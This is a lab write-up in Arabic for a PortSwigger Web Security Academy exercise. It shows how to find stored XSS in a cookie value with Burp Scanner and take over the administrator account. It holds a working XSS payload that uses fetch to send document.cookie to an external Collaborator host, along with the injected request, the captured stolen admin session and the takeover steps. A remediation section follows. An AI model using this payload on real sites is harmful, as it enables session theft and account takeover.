# [Scanning non-standard data structures](https://portswigger.net/web-security/essential-skills/using-burp-scanner-during-manual-testing/lab-scanning-non-standard-data-structures)

## **`الهدف`**
قم بحذف حساب `Carlos`.
## **`خطوات الحل`**
==**`ملاحظة هامة:`**== لا يمكن حل هذا اللاب إلا باستعمال أداة `Burp Collaborator` والتي تتوفر فقط في النسخة المدفوعة من `Burp Suite`.

سنقوم بتسجيل الدخول إلى حساب `wiener:peter`، وبفحص أى طلب يحتوى على الـ `Cookies`
```http
GET /my-account?id=wiener HTTP/2
Host: 0a4c003103117a7a82f6653e00d000d6.web-security-academy.net
Cookie: session=wiener%3awcxa0o09pkDFr8FuUFnIHJ2t6e8CraXV
```
سنجد أنه عند عمل `URL Decoding` للـ `Cookie` ستكون كالتالي:
```
wiener:wcxa0o09pkDFr8FuUFnIHJ2t6e8CraXV
```

لذلك سنقوم بتحديد كلمة `wiener` ونقوم بالضغط على زر الماوس الأيمن ثم `Scan selected insertion point` وسنتوجه إلى تاب `Target` وسننتظر حتى انتهاء الفحص وبعدها بعدة دقائق كذلك

وعند التوجه إلى التاب الفرعي `Audit Log` سنجد ثغرة `XSS (Stored)` كالتالي:
```
### Issue detail

The payload '"><svg/onload=fetch`//4w1ky8ylazz72eslzfbhv3x6cxit6jubkzbpyfm4\.oastify.com`> was submitted in the manual insertion point 1. This payload is designed to cause a web browser that renders it to make a request to an external domain. An HTTP request was made to that domain, indicating that the payload was rendered and executed within a web browser. The interaction occurred approximately **18 seconds** after the scan of the item was completed.  
  
The incoming HTTP request to the Collaborator server contained the following URL in the Referer header, which may indicate the location where the payload was rendered within a web browser: https://0a4c003103117a7a82f6653e00d000d6.web-security-academy.net/
```

لذلك سنعود إلى الطلب الأصلى ونقوم بحقن الـ `Payload` التالي بدلًا من قيمة `wiener` من داخل `Inspector` مع وضع رابط الـ `Subdomain` الخاص بـ `Burp Collaborator` في موضعه.
```
'"><svg/onload=fetch(`//YOUR-COLLABORATOR-PAYLOAD/${encodeURIComponent(document.cookie)}`)>
```
ليصبح الطلب كالتالي:
```http
GET /my-account?id=wiener HTTP/2
Host: 0a4c003103117a7a82f6653e00d000d6.web-security-academy.net
Cookie: session='%22%3e%3csvg%2fonload%3dfetch(%60%2f%2fbfun44r7ds5zrusl80mq8jjhk8q5ev2k.oastify.com%2f%24%7bencodeURIComponent(document.cookie)%7d%60)%3e%3awcxa0o09pkDFr8FuUFnIHJ2t6e8CraXV
```

ثم سنقوم بإرسال الطلب وسنجد أن الإستجابة هي `500 Internal Server Error`، ولكن هذا طبيعى فكل ما علينا فعله هو الانتظار قليلًا وسنجد أن هناك تفاعلات حدث فى `Collaborator`

وسنجد تفاعل `HTTP` كالتالي:
```http
GET /session%3Dadministrator%253aJ7tAyhiJSzyXG7luPvbU6NxQ0YP1ledk%3B%20secret%3DCb41TZEPOmT93Jl9yR2KZtPFumPT9BDV%3B%20session%3Dadministrator%253aJ7tAyhiJSzyXG7luPvbU6NxQ0YP1ledk HTTP/1.1
Host: bfun44r7ds5zrusl80mq8jjhk8q5ev2k.oastify.com
Connection: keep-alive
sec-ch-ua-platform: "Linux"
User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36
sec-ch-ua: "Not:A-Brand";v="8", "Chromium";v="156", "Google Chrome";v="156"
sec-ch-ua-mobile: ?0
Accept: */*
Origin: https://0a4c003103117a7a82f6653e00d000d6.web-security-academy.net
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a4c003103117a7a82f6653e00d000d6.web-security-academy.net/
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: en-US,en;q=0.9
```

وسنقوم بنسخ السطر بعد `GET` وسنقوم بعمل `URL Decoding` له من داخل `Burp Decoder` لنجده كالتالي:
```
/session=administrator%3aJ7tAyhiJSzyXG7luPvbU6NxQ0YP1ledk; secret=Cb41TZEPOmT93Jl9yR2KZtPFumPT9BDV; session=administrator%3aJ7tAyhiJSzyXG7luPvbU6NxQ0YP1ledk
```

فسنقوم بنسخ قيمة الـ `Cookie` فقط وهي: `administrator%3aJ7tAyhiJSzyXG7luPvbU6NxQ0YP1ledk`

ثم نقوم بالذهاب إلى المتصفح داخل اللاب ونضغط `F12` ثم  `Application` ونضعه في خانة الـ `Session` داخل الـ `Cookies` ثم نضغط `Enter` وسنجد أن الـ `Admin Panel` أصبحت ظاهرة فندخل إليها ونقوم بحذف حساب `Carlos` لننتهي من حل اللاب.
## **`ترقيع الثغرة`**
يجب تحويل أي رموز خاصة `Special Characters` موجودة في البيانات إلى ما يقابلها في `HTML Entities` قبل عرضها في صفحة الـ `Admin`.

ويجب على مسؤول النظام إعداد جدار حماية تطبيقات الويب `WAF` لفحص وتحليل جميع الطلبات الواردة، فحتى لو نسي المطورون ترقيع الثغرة برمجياً، سيتدخل الـ `WAF` ويحظر الطلب المشبوه ويمنع وصول الـ `Payload` إلى السيرفر بفضل قواعد الحماية `Rules` المحدثة.

ويجب تفعيل خاصية `HttpOnly` لملفات تعريف الارتباط الخاصة بالجلسة `Session Cookies`، وعلى الرغم أن هذا الإجراء لن يمنع ثغرة الـ `XSS` من الحدوث، ولكنه سيمنع كود الجافاسكريبت الخبيث من الوصول إلى الجلسة عبر `document.cookie`، مما يفشل محاولات اختراق الحساب `Account Takeover`.

وكطبقة حماية إضافية، يجب استخدام `CSP` لتقييد الأماكن التي يمكن للمتصفح إرسال بيانات إليها باستخدام موجه `connect-src` وكذلك لمنع تنفيذ أكواد `JS` المدمجة `Inline Scripts`.

وبدلًا من استخدام هيكل مثل `username:token` كنص صريح داخل الـ `Cookie` والذي يعتبر تصميم سيء `Bad Practice`، لأنه يسمح للمستخدم بالتلاعب في هويته أو إدخال بيانات ضارة بسهولة، فيجب استخدام `Opaque Tokens` وهي عبارة عن سلسلة حروف وأرقام عشوائية طويلة مثل `SessionID=xyz123...` يتم ربطها ببيانات المستخدم في قاعدة البيانات على السيرفر، أو استخدام تقنيات مثل `JWT` بشرط أن تكون مُوقعة رقميًا.
